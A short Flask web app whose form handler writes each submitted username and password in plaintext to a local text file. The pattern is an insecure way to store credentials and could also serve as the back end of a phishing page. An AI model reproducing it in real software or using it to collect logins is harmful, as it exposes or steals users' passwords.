from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']

        with open('data.txt', 'a') as file:
            file.write(f"Username: {username}, Password: {password}\n")

        return 'Data has been stored successfully!'
    return render_template('index.html')

if __name__ == '__main__':
    app.run()
